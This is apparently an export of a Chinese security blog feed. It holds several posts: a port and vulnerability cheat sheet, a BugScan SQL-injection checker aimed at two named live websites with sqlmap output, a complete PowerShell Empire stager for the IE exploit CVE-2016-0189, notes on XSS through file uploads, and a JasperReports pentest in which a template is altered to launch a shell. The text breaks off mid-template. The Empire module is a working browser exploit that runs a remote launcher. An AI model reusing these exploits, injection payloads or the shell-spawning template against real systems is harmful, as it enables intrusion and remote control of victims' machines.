    <url>%2F2017%2F01%2F24%2FPORT-%E6%9C%8D%E5%8A%A1-%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[范围：0-65535固定端口：0-1023 1024保留动态端口：1024-65535 常用端口21：FTP(爆破) 22：SSH(爆破) 23：Telnet(爆破) 25：SMTP 53：DNS（UDP） 69：TFTP（cisco，类似FTP） 79：Finger 80：HTTP 110：POP3 111：RPC 远程过程调用 113：windows 验证服务 119：NNTP 网络新闻组传输协议 135：RPC 远程过程调用 137：NetBIOS 139：windows文件和打印机共享，Unix中的samba服务 161：SNMP 简单网络管理协议 389：LDAP 443：HTTPS 445：SMB 1080：socks代理服务 2082/2083 cpanel主机管理系统登陆 (国外用较多) 2222 DA虚拟主机管理系统登陆 (国外用较多) 2601,2604：zebra路由，默认密码zebra 3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 3312/3311 kangle主机管理系统登陆 3389:远程桌面 4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 5900：vnc 6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 7001,7002 WebLogic默认弱口令，反序列 8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 8080：用户www代理服务,tomcat/WDCP主机管理系统，默认弱口令 8080,8089,9090 JBOSS 8083 Vestacp主机管理系统 （国外用较多） 8649 ganglia 8888 amh/LuManager 主机管理系统默认端口 9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 10000 Virtualmin/Webmin 服务器虚拟主机管理系统 11211 memcache未授权访问 27017,27018 Mongodb未授权访问 28017 mongodb统计页面 50000 SAP命令执行 50070,50030 hadoop默认端口未授权访问 木马病毒5554：worm.Sasser病毒利用端口7626：冰河病毒8011：WAY2.4病毒7306：Netspy3.0病毒1024：YAI病毒 中间件7001,7002：weblogic9080：webshpere应用程序9090：webshpere管理工具8080：tomcat默认端口Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093，默认为8080 数据库3306：mysql1433：mssqlserver1434：sqlserver monitor1521：oracle:(iSqlPlus Port:5560,7778)5432：PostgreSQL1158：ORACLE EMCTL8080：Oracle XDB2100：Oracle XDB FTP 特殊服务（漏洞）443：SSL心脏滴血 512,513,514：Rsync未授权访问 873：Rsync未授权访问 1025,111 NFS 2375：docker remote api漏洞 50000：SAP命令执行 5984：CouchDB http://xxx:5984/_utils/ 6379：redis未授权 7001,7002：WebLogic 默认弱口令，反序列化 9200,9300：elasticsearch未授权访问 11211：memcache未授权访问 27017,27018：Mongodb 未授权访问28017：mongodb统计页面]]></content>
  </entry>
  <entry>
    <title><![CDATA[BugScan插件编写]]></title>
    <url>%2F2017%2F01%2F22%2FBugScan%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%2F</url>
    <content type="text"><![CDATA[最近四叶草又开始招收实习了，所以某个妹子就投了简历。不久四叶草发来一个题目要妹子完成。So？这意味着什么，这意味着一个泡妹子的好时机来了啊。哈哈哈…… 下面就让我们看看这个题目： 某通用平台被曝出有一处高危注入，以下为详情： 1http://www.exploit.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1 userName处为一处报错注入， 请使用python编写一个通用脚本检测该处注入点(可使用任何python库)，要求测试该脚本必须使用多个目标站点。以下为两个测试站点（请勿做除测试之外的任何危险动作） 12http://www.jmsyzx.com/http://www.globechildren.com/ 哎呦，不限制python库，一个通用脚本。刚跟室友开黑了一下守望先锋（挺好玩儿的，有兴趣一起啊）的我刚看也是一脸懵逼，总之刚开始想的太多了，但其实也就是一个插件的事情（还是range一棒打醒我，所以以后还是干完正事再开黑）。 看了一下是mssql数据库，并且是报错注入。我们可以手工构造看数据库类型： 1http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=@@version-- 也可以sqlmap跑一下看看： 1234567891011121314151617181920[22:07:32] [INFO] resuming back-end DBMS &apos;microsoft sql server&apos;[22:07:32] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: userName (GET)Type: error-basedTitle: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clausePayload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos; AND 2390=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (2390=2390) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(112)+CHAR(118)+CHAR(113))) AND &apos;nTAv&apos;=&apos;nTAvType: stacked queriesTitle: Microsoft SQL Server/Sybase stacked queries (comment)Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos;;WAITFOR DELAY &apos;0:0:5&apos;--Type: AND/OR time-based blindTitle: Microsoft SQL Server/Sybase time-based blind (comment)Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos; WAITFOR DELAY &apos;0:0:5&apos;-----[22:07:33] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2005[22:07:33] [INFO] fetched data logged to text files under &apos;C:\Users\ZEROYU\.sqlmap\output\www.jmsyzx.com&apos; 别多看看那个GET就行了，GET最简单了。我们就抓住报错跟打印MD5这两点就行了。 打印MD5呢，mssql有两种方式： 1231.http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27))--2.http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))-- 直接上我写的脚本： 12345678910111213141516171819202122#!/usr/bin/evn python#-*-:coding:utf-8 -*-"""POC Name : 泡妹专享Author : zeroyumail : zeroyu.xyz@gmail.com"""import hackhttpimport timedef assign(service, arg): if service == 'fingerprint.girl': return True, argdef audit(arg): payload = "/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--" url = arg + payload code, head, res, errcode, _ = hackhttp.http(url) time.sleep(1) if code == 500 and '81dc9bdb52d04dc20036dbd8313ed055' in res: security_hole(url)if __name__=='__main__': from dummy import * audit(assign('fingerprint.girl','http://www.jmsyzx.com/')[1]) 是不是想问我hackhttp是个什么库，看文档去。 好，今天妹子就泡到这儿。]]></content>
  </entry>
  <entry>
    <title><![CDATA[POWERSHELL EMPIRE + CVE-2016-0189 = PROFIT]]></title>
    <url>%2F2017%2F01%2F22%2FPOWERSHELL-EMPIRE-CVE-2016-0189-PROFIT%2F</url>
    <content type="text"><![CDATA[​ Powershell Empire 是我们在渗透目标用户时一直都很喜欢的工具之一，虽然我们通常都是用Metaspolit和Empire来一起完成工作，使浏览器漏洞和经验结合在Empire中。在最近的一次测试中我们没有选择去使用MSF，相反我们和一个新的“经验丰富”的Empire一起利用CVE-2016-0189（也就是vbscrupt_godmode）其攻击使用IE9—11的用户。Empire是近6个月来我们首选的使用并且最近开始打造漏洞工具箱。如果成功，powershell将会登录并通过一个代理链接到Empire。重要的是硬盘上不会留下任何信息。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224from lib.common import helpersclass Stager: def __init__(self, mainMenu, params=[]): self.info = &#123; 'Name': 'MS16-051 IE RCE', 'Author': ['www.cgsec.co.uk'], 'Description': ('Leverages MS16-051 to execute powershell in unpatched browsers. This is a file-less vector which works on IE9/10/11 and all versions of Windows'), 'Comments': [ 'Target will have to open link with vulnerable version of IE.' ] &#125; # any options needed by the stager, settable during runtime self.options = &#123; # format: # value_name : &#123;description, required, default_value&#125; 'Listener' : &#123; 'Description' : 'Listener to generate stager for.', 'Required' : True, 'Value' : '' &#125;, 'StagerRetries' : &#123; 'Description' : 'Times for the stager to retry connecting.', 'Required' : False, 'Value' : '0' &#125;, 'OutFile' : &#123; 'Description' : 'File to output HTML to, otherwise displayed on the screen.', 'Required' : True, 'Value' : '' &#125;, 'Base64' : &#123; 'Description' : 'Switch. Base64 encode the powershell output.', 'Required' : True, 'Value' : 'True' &#125;, 'UserAgent' : &#123; 'Description' : 'User-agent string to use for the staging request (default, none, or other).', 'Required' : False, 'Value' : 'default' &#125;, 'Proxy' : &#123; 'Description' : 'Proxy to use for request (default, none, or other).', 'Required' : False, 'Value' : 'default' &#125;, 'ProxyCreds' : &#123; 'Description' : 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).', 'Required' : False, 'Value' : 'default' &#125; &#125; # save off a copy of the mainMenu object to access external functionality # like listeners/agent handlers/etc. self.mainMenu = mainMenu for param in params: # parameter format is [Name, Value] option, value = param if option in self.options: self.options[option]['Value'] = value def generate(self): # extract all of our options listenerName = self.options['Listener']['Value'] base64 = self.options['Base64']['Value'] userAgent = self.options['UserAgent']['Value'] proxy = self.options['Proxy']['Value'] proxyCreds = self.options['ProxyCreds']['Value'] stagerRetries = self.options['StagerRetries']['Value'] encode = False if base64.lower() == "true": encode = True # generate the launcher code launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries) if launcher == "": print helpers.color("[!] Error in launcher command generation.") return "" else: code = "&lt;html&gt;\n" code += "&lt;head&gt;\n" code += "&lt;meta http-equiv=\"x-ua-compatible\" content=\"IE=10\"&gt;\n" code += "&lt;/head&gt;\n" code += "&lt;body&gt;\n" code += " &lt;script type=\"text/vbscript\"&gt;\n" code += " Dim aw\n" code += " Dim plunge(32)\n" code += " Dim y(32)\n" code += " prefix = \"%u4141%u4141\"\n" code += " d = prefix &amp; \"%u0016%u4141%u4141%u4141%u4242%u4242\"\n" code += " b = String(64000, \"D\")\n" code += " c = d &amp; b\n" code += " x = UnEscape(c)\n" code += " \n" code += " Class ArrayWrapper\n" code += " Dim A()\n" code += " Private Sub Class_Initialize\n" code += " ReDim Preserve A(1, 2000)\n" code += " End Sub\n" code += " \n" code += " Public Sub Resize()\n" code += " ReDim Preserve A(1, 1)\n" code += " End Sub\n" code += " End Class\n" code += " \n" code += " Class Dummy\n" code += " End Class\n" code += " \n" code += " Function getAddr (arg1, s)\n" code += " aw = Null\n" code += " Set aw = New ArrayWrapper\n" code += " \n" code += " For i = 0 To 32\n" code += " Set plunge(i) = s\n" code += " Next\n" code += " \n" code += " Set aw.A(arg1, 2) = s\n" code += " \n" code += " Dim addr\n" code += " Dim i\n" code += " For i = 0 To 31\n" code += " If Asc(Mid(y(i), 3, 1)) = VarType(s) Then\n" code += " addr = strToInt(Mid(y(i), 3 + 4, 2))\n" code += " End If\n" code += " y(i) = Null\n" code += " Next\n" code += " \n" code += " If addr = Null Then\n" code += " document.location.href = document.location.href\n" code += " Return\n" code += " End If\n" code += " getAddr = addr\n" code += " End Function\n" code += " \n" code += " Function leakMem (arg1, addr)\n" code += " d = prefix &amp; \"%u0008%u4141%u4141%u4141\"\n" code += " c = d &amp; intToStr(addr) &amp; b\n" code += " x = UnEscape(c)\n" code += " \n" code += " aw = Null\n" code += " Set aw = New ArrayWrapper\n" code += " \n" code += " Dim o\n" code += " o = aw.A(arg1, 2)\n" code += " \n" code += " leakMem = o\n" code += " End Function\n" code += " \n" code += " Sub overwrite (arg1, addr)\n" code += " d = prefix &amp; \"%u400C%u0000%u0000%u0000\"\n" code += " c = d &amp; intToStr(addr) &amp; b\n" code += " x = UnEscape(c)\n" code += " \n" code += " aw = Null\n" code += " Set aw = New ArrayWrapper\n" code += " \n" code += " \n" code += " aw.A(arg1, 2) = CSng(0)\n" code += " End Sub\n" code += " \n" code += " Function exploit (arg1)\n" code += " Dim addr\n" code += " Dim csession\n" code += " Dim olescript\n" code += " Dim mem\n" code += " \n" code += " \n" code += " Set dm = New Dummy\n" code += " \n" code += " addr = getAddr(arg1, dm)\n" code += " \n" code += " mem = leakMem(arg1, addr + 8)\n" code += " csession = strToInt(Mid(mem, 3, 2))\n" code += " \n" code += " mem = leakMem(arg1, csession + 4)\n" code += " olescript = strToInt(Mid(mem, 1, 2))\n" code += " overwrite arg1, olescript + &amp;H174\n" code += " Set Object = CreateObject(\"Wscript.Shell\")\n" code += " Object.run(\"" code += launcher + "\")\n" code += " End Function\n" code += " \n" code += " Function triggerBug\n" code += " aw.Resize()\n" code += " Dim i\n" code += " For i = 0 To 32\n" code += " ' 24000x2 + 6 = 48006 bytes\n" code += " y(i) = Mid(x, 1, 24000)\n" code += " Next\n" code += " End Function\n" code += " &lt;/script&gt;\n" code += " \n" code += " &lt;script type=\"text/javascript\"&gt;\n" code += " function strToInt(s)\n" code += " &#123;\n" code += " return s.charCodeAt(0) | (s.charCodeAt(1) &lt;&lt; 16);\n" code += " &#125;\n" code += " function intToStr(x)\n" code += " &#123;\n" code += " return String.fromCharCode(x &amp; 0xffff) + String.fromCharCode(x &gt;&gt; 16);\n" code += " &#125;\n" code += " var o;\n" code += " o = &#123;\"valueOf\": function () &#123;\n" code += " triggerBug();\n" code += " return 1;\n" code += " &#125;&#125;;\n" code += " setTimeout(function() &#123;exploit(o);&#125;, 50);\n" code += " &lt;/script&gt;\n" code += "&lt;/body&gt;\n" code += "&lt;/html&gt;" return code ms16.py 首先我们可以从Github获取Empire 现在我们已经下载了Empire，接下来我们要安装apache2以便于我们把索引页面直接放到/var/www/html路径下。这一步是可选的，因为大多数人都想改变输出位置，模糊它来逃避杀毒引擎或者类似的产品。 接下来该添加我们的新规则了。这需要将脚本放在/lib/stagers下并且运行Empire的install.sh脚本去添加并运行它。如果你的运行在Ubuntu环境中，你可能要在运行这些脚本之前去安装pip。 现在我们已经准备好并要第一次去启动Empire了。如果一切都顺利的话我们应该可以去使用我们添加的ms16脚本、设置我们的输出文件到/var/www/html/index.html并且放置直接目标到其中。更高级的用户可能想要去设置一些稍微复杂的到服务中来利用不同客户或不同的向量来混淆视听，这些就已经超出本文要描述的范围了。 我个人更偏向于设置443端口的监听以期bypass一些防火墙并逃避一些检测机制。 现在去生成我们的恶意HTML 现在当你的服务被某个使用带有相关漏洞浏览器的用户浏览的时候，这个攻击载荷将被触发同时你将看到一个新的代理在Empire中。使用持久性模块创建任务通常是个好注意，相似的也可以确保你不因为重新启动而丢失权限。这些可以通过设置自动运行的代理从而设置为自动运行一个新的客户端连接。]]></content>
  </entry>
  <entry>
    <title><![CDATA[XSS姿势——文件上传XSS]]></title>
    <url>%2F2017%2F01%2F22%2FXSS%E5%A7%BF%E5%8A%BF%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0XSS%2F</url>
    <content type="text"><![CDATA[0x01 简单介绍 一个文件上传点是执行XSS应用程序的绝佳机会。很多网站都有用户权限上传个人资料图片的上传点，你有很多机会找到相关漏洞。如果碰巧是一个self XSS，你可以看看这篇文章。 0x02 实例分析 首先基本上我们都可以找到类似下面的一个攻击入口点，我觉得这个并不难。 姿势一：文件名方式文件名本身可能会反映在页面所以一个带有XSS命名的文件便可以起到攻击作用。 虽然我没有准备靶场，但是你可以选择在W3Schools练习这种XSS 。 姿势二：Metadata使用exiftool这个工具可以通过改变EXIF metadata进而一定几率引起某处反射： 例如： 姿势三：Content如果应用允许上传SVG格式的文件（其实就是一个图像类型的），那么带有以下content的文件可以被用来触发XSS： 一个 PoC用来验证。你可以通过访问brutelogic.com.br/poc.svg看到效果 姿势四：Source建立一个携带有JavaScript payload的GIF图像用作一个脚本的源。这对绕过CSP（内容安全策略）保护“script-src ‘self’”（即不允许使用示例的这种xss方式进行攻击alert(1)）是很有用的，但前提是我们能够成功地在相同的域注入，如下所示。 要创建这样的图像需要这个作为content 和 name，并使用.gif扩展名： 这个GIF的图片头——GIF89a，作为alert function的变量分配给alert function。但是他们之间，还有一个被标注的XSS变量用来防止图片被恢复为text/HTML MIME文件类型，因此只需发送一个对这个文件的请求payload 就可以被执行。 正如我们下面看到的，文件类unix命令和PHP函数中的exif_imagetype（）和getimagesize（）会将其识别为一个GIF文件。所以如果一个应用程序仅仅是使用这些方式验证是否是一个图像，那么该文件将可以上传成功（但可能在上传后被杀掉）。 0x03 最后 如果你想知道更多的有其标志性ASCII字符可以用于一个javascript变量赋值的文件类型，看我随后的文章。 也有很多比较详细的使用XSS和图像文件相结合绕过图形处理函数库过滤的例子。这方面的一个很好的例子是here 原文链接：http://brutelogic.com.br/blog/]]></content>
  </entry>
  <entry>
    <title><![CDATA[PNG文件中的LSB隐写]]></title>
    <url>%2F2017%2F01%2F22%2FPNG%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84LSB%E9%9A%90%E5%86%99%2F</url>
    <content type="text"><![CDATA[看到MottoIn的一篇文章时关于LSB隐写的，正好赶上中秋攒了一堆月饼没处放，就想由此出个题送送月饼。 环境：win10 python27 lsb脚本使用了https://github.com/cyberinc/cloacked-pixel 在使用之前需要几个python包，主要说下win10下如何安装这些包 1.PIL 这个包你按廖雪峰官网上的方法可能安装不上，所以我给出我自己的解决办法： 到https://pypi.python.org/pypi/Pillow/2.7.0找到exe安装包双击 主要是PIL官方编译包有bug，所以最好下载第三方组织编译包，强烈推荐pillow的确好用 2.matplotlib 这个包的安装直接参考官方网站的方法，注意一步一步来。 123456python -m pip install --upgrade pippython -m pip install --upgrade numpypython -m pip install --upgrade pytzpython -m pip install --upgrade pyparsingpython -m pip install --upgrade cyclerpython -m pip install --upgrade matplotlib 这就ok了，很简单。 接下来按照MottoIn这个玩就好了。]]></content>
  </entry>
  <entry>
    <title><![CDATA[win10只有edge可以打开网页]]></title>
    <url>%2F2017%2F01%2F22%2Fwin10%E5%8F%AA%E6%9C%89edge%E5%8F%AF%E4%BB%A5%E6%89%93%E5%BC%80%E7%BD%91%E9%A1%B5%2F</url>
    <content type="text"><![CDATA[按住win+x 然后选择“命令提示符（管理员）” 输入 netsh winsock reset 重启就好了。。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hacking JasperReports-隐藏shell的特征]]></title>
    <url>%2F2017%2F01%2F22%2FHacking-JasperReports-%E9%9A%90%E8%97%8Fshell%E7%9A%84%E7%89%B9%E5%BE%81%2F</url>
    <content type="text"><![CDATA[不久前，我的同事跟我在对一个客户端进行渗透测试。我们确实发现的一件事是,他们留下了几个联网的JasperReports服务器。寻找默认管理帐户的用户名并没有花费太多的精力。 也没有用多久我们就猜解出密码是“jasperadmin” 我从前听过JasperReports但从来没有碰到过要对它进行渗透测试。一个快速的google搜索也没有对前期工作产生多大的作用。尽管这个管理界面很不常见但是它也没有摆脱以某种方式来执行代码，所以顺利成章的我们开始在渗透旅程中把JasperReports渗透测试添加进“容易成功”的列表。 代码和小脚本JasperReports的目的是提取数据从各种各样的来源，例如：databases, xml, flat files等等，并且基于用户定义的模板用某种方式生成一份漂亮的报告。模板在JasperReports被定义为“JRXML”文件，任何拥有创建编辑报告权限的用户都可以上传它。 JasperReports的设计者允许数据在被包含在报告之前自定义操作。接下来就是利用一些小技巧用Java来编写一段脚本！我想也许你会看到这个。 我们的目标呢，就是创建一个报告模板（JRXML file）当然是依旧定制的恶意脚本，当它运行时，我们可以收到一个shell。这篇文章的其余部分将会详细描述我们是如何将脚本和报告模板联系到一起的。 编辑模板我们仅仅编辑一个存在的模板而不是创建一个。以下是我们将使用的模板。注意一下，过于复杂以及其中的90%是完全不必要的。下面这个只是一个带有“JasperStudio”的简单样本报告。35–42行是有趣的一个部分，我在这个部分插入了“ShellScriptlet”。 shell.jrxml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!-- Created with Jaspersoft Studio version 6.0.1.final using JasperReports Library version 6.0.0 --&gt;&lt;!-- 2016-10-04T14:01:12 --&gt;&lt;jasperReport xmlns="http://jasperreports.sourceforge.net/jasperreports" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd" name="AllAccounts" pageWidth="595" pageHeight="842" whenNoDataType="AllSectionsNoDetail" columnWidth="515" leftMargin="40" rightMargin="40" topMargin="50" bottomMargin="50" isSummaryWithPageHeaderAndFooter="true" uuid="17f4b3c5-e096-4a65-b030-ed3bb58ce311"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.language" value="EN-US"/&gt;&lt;style name="Sans_Normal" isDefault="true" fontName="DejaVu Sans" fontSize="12"/&gt;&lt;style name="Sans_Bold" fontName="DejaVu Sans" fontSize="12" isBold="true"/&gt;&lt;style name="Sans_Italic" fontName="DejaVu Sans" fontSize="12" isItalic="true"/&gt;&lt;style name="PageHeader" style="Sans_Bold" forecolor="#FFFFFF" backcolor="#333333"/&gt;&lt;style name="detail" fontName="DejaVu Sans" fontSize="12"&gt;&lt;conditionalStyle&gt;&lt;conditionExpression&gt;&lt;![CDATA[new Boolean($V&#123;CityGroup_COUNT&#125;.intValue() % 2 == 0)]]&gt;&lt;/conditionExpression&gt;&lt;style mode="Opaque" backcolor="#E0E0E0"/&gt;&lt;/conditionalStyle&gt;&lt;/style&gt;&lt;subDataset name="Table Dataset 1" uuid="4fcc1d09-9859-48ee-bb6f-8d369bd49113"&gt;&lt;queryString&gt;&lt;![CDATA[SELECT name, phone_office, billing_address_city, billing_address_street, billing_address_country FROM accounts ORDER BY billing_address_country, billing_address_city]]&gt;&lt;/queryString&gt;&lt;field name="name" class="java.lang.String"/&gt;&lt;field name="phone_office" class="java.lang.String"/&gt;&lt;field name="billing_address_city" class="java.lang.String"/&gt;&lt;field name="billing_address_street" class="java.lang.String"/&gt;&lt;field name="billing_address_country" class="java.lang.String"/&gt;&lt;sortField name="billing_address_country"/&gt;&lt;sortField name="billing_address_city"/&gt;&lt;variable name="CityyNumber" class="java.lang.Integer" incrementType="Group" incrementGroup="CityGroup" calculation="Count"&gt;&lt;variableExpression&gt;&lt;![CDATA[Boolean.TRUE]]&gt;&lt;/variableExpression&gt;&lt;initialValueExpression&gt;&lt;![CDATA[new Integer(0)]]&gt;&lt;/initialValueExpression&gt;&lt;/variable&gt;&lt;group name="CityGroup"&gt;&lt;groupExpression&gt;&lt;![CDATA[$F&#123;billing_address_city&#125;]]&gt;&lt;/groupExpression&gt;&lt;/group&gt;&lt;/subDataset&gt;&lt;scriptlet name="ShellScriptlet" class="foxglove.shell.ShellScriptlet"&gt;&lt;scriptletDescription&gt;&lt;![CDATA[]]&gt;&lt;/scriptletDescription&gt;&lt;/scriptlet&gt;&lt;title&gt;&lt;band height="79" splitType="Stretch"&gt;&lt;textField&gt;&lt;reportElement x="227" y="20" width="100" height="30" uuid="32a2a8ff-d90a-48d7-b044-5325b5c6264f"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA[$P&#123;ShellScriptlet_SCRIPTLET&#125;.getShell()]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/band&gt;&lt;/title&gt;&lt;pageFooter&gt;&lt;band height="40"&gt; &lt;line&gt;&lt;reportElement x="0" y="10" width="515" height="1" uuid="19826638-0487-4bb5-9b15-7e7af63b8dce"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.table" value="end"/&gt;&lt;/reportElement&gt;&lt;/line&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement x="200" y="20" width="80" height="16" uuid="6f072af1-756c-49f4-82f3-af59e8124296"/&gt;&lt;textElement textAlignment="Right"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA["Page " + String.valueOf($V&#123;PAGE_NUMBER&#125;) + " of"]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;textField isStretchWithOverflow="true" evaluationTime="Report"&gt;&lt;reportElement x="280" y="20" width="75" height="16" uuid="02b15e9e-d360-4b82-a140-54b9bd3b0e81"/&gt;&lt;textElement textAlignment="Left"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA[" " + String.valueOf($V&#123;PAGE_NUMBER&#125;)]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/band&gt;&lt;/pageFooter&gt;&lt;summary&gt;&lt;band height="149" splitType="Stretch"&gt;&lt;image scaleImage="Clip" hAlign="Right" vAlign="Middle" onErrorType="Icon"&gt;&lt;reportElement positionType="Float" x="0" y="71" width="250" height="70" uuid="aa8a8976-039f-45ac-84f3-d8d55b442410"/&gt;&lt;imageExpression&gt;&lt;![CDATA["repo:LogoLink"]]&gt;&lt;/imageExpression&gt;&lt;hyperlinkTooltipExpression&gt;&lt;![CDATA["JasperReports Logo"]]&gt;&lt;/hyperlinkTooltipExpression&gt;&lt;/image&gt;&lt;image scaleImage="Clip" hAlign="Right" vAlign="Middle" onErrorType="Icon"&gt;&lt;reportElement positionType="Float" x="265" y="71" width="250" height="70" uuid="4b5dd0d1-9011-42cf-ab07-f80c02d3d166"/&gt;&lt;imageExpression&gt;&lt;![CDATA["repo:AllAccounts_Res2"]]&gt;&lt;/imageExpression&gt;&lt;hyperlinkTooltipExpression&gt;&lt;![CDATA["Jaspersoft Logo"]]&gt;&lt;/hyperlinkTooltipExpression&gt;&lt;/image&gt;&lt;componentElement&gt;&lt;reportElement key="table" x="0" y="0" width="515" height="70" uuid="db3dd84a-3743-43b3-ab7e-c4aebdb907df"/&gt;&lt;jr:table xmlns:jr="http://jasperreports.sourceforge.net/jasperreports/components" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports/components http://jasperreports.sourceforge.net/xsd/components.xsd" whenNoDataType="AllSectionsNoDetail"&gt;&lt;datasetRun subDataset="Table Dataset 1" uuid="3b2a079f-f600-46a6-a7af-720c4e939e7e"&gt;&lt;connectionExpression&gt;&lt;![CDATA[$P&#123;REPORT_CONNECTION&#125;]]&gt;&lt;/connectionExpression&gt;&lt;/datasetRun&gt;&lt;jr:columnGroup width="515" uuid="1e5d630a-c8f9-4dbb-8415-393f7624ca35"&gt;&lt;jr:groupHeader groupName="CityGroup"&gt;&lt;jr:cell height="30" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="Sans_Bold" positionType="Float" mode="Opaque" x="0" y="14" width="515" height="16" isPrintWhenDetailOverflows="true" backcolor="#C0C0C0" uuid="aeafecc2-ef7e-435c-ae07-1f45ed6b179a"/&gt;&lt;box leftPadding="0" bottomPadding="0" rightPadding="0"&gt;&lt;bottomPen lineWidth="1.0" lineStyle="Solid"/&gt;&lt;/box&gt;&lt;textElement textAlignment="Left"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA[" " + String.valueOf($V&#123;CityyNumber&#125;.intValue() + 1) + ". " + $F&#123;billing_address_city&#125;+ ", " + $F&#123;billing_address_country&#125;]]&gt;&lt;/textFieldExpression&gt;&lt;anchorNameExpression&gt;&lt;![CDATA[String.valueOf($F&#123;billing_address_city&#125;)]]&gt;&lt;/anchorNameExpression&gt;&lt;/textField&gt;&lt;/jr:cell&gt;&lt;/jr:groupHeader&gt;&lt;jr:column width="30" uuid="43ffff20-e89f-4f73-ad8d-878e9581274a"&gt;&lt;jr:columnHeader height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="PageHeader" positionType="Float" stretchType="RelativeToBandHeight" mode="Opaque" x="0" y="4" width="30" height="16" isPrintWhenDetailOverflows="true" uuid="a76dcb9c-8601-48bc-b9cc-3d1c316e537d"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.th" value="full"/&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.colspan" value="1"/&gt;&lt;/reportElement&gt;&lt;textFieldExpression&gt;&lt;![CDATA[" "]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:columnHeader&gt;&lt;jr:detailCell height="20" rowSpan="1"&gt;&lt;textField&gt;&lt;reportElement style="detail" positionType="Float" stretchType="RelativeToBandHeight" x="0" y="0" width="30" height="20" isPrintWhenDetailOverflows="true" uuid="73a40f28-2c08-4849-a2a9-b83ade7a6b7d"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.td" value="full"/&gt;&lt;/reportElement&gt;&lt;box topPadding="4" leftPadding="0" bottomPadding="0" 